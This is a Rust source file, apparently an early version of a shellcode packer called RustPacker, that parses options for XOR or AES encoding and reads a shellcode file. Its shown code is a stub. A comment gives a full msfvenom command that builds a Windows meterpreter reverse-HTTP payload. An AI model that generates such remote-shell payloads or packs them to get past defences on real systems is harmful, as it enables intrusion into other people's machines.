use clap::{Arg, ArgMatches, Command, PossibleValue};
use std::path::Path;

fn parser() -> ArgMatches {
    let args = Command::new("RustPacker")
        .author("by Nariod")
        .version("0.1")
        .about("Shellcode packer written in Rust.")
        .arg_required_else_help(true)
        .arg(
            Arg::with_name("Path to shellcode file")
                .takes_value(true)
                .short('f')
                .required(true),
        )
        .arg(Arg::with_name("Output file").takes_value(true).short('o'))
        .arg(
            Arg::with_name("encryption / encoding method")
                .takes_value(true)
                .short('e')
                .required(true)
                .value_parser([
                    PossibleValue::new("xor").help("'Exclusive or' encoding"),
                    PossibleValue::new("aes").help("AES encryption"),
                ]),
        )
        .get_matches();

    args
}

fn shellcode_reader_from_file(path: &Path) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let bytes = std::fs::read(path)?;
    Ok(bytes)
}

fn main() {
    dbg!("Entering main function");
    let _args = parser();
    let path_to_shellcode_file = Path::new("shellcode.bin");
    let shellcode = shellcode_reader_from_file(path_to_shellcode_file);

    match shellcode {
        Ok(bytes) => {
            // shellcode used for tests msfvenom -p windows/x64/meterpreter_reverse_http LHOST=127.0.0.1 EXITFUNC=thread LPORT=80 -f raw -o shellcode.bin
            dbg!(bytes);
        }
        Err(err) => panic!("{:?}", err),
    }
}
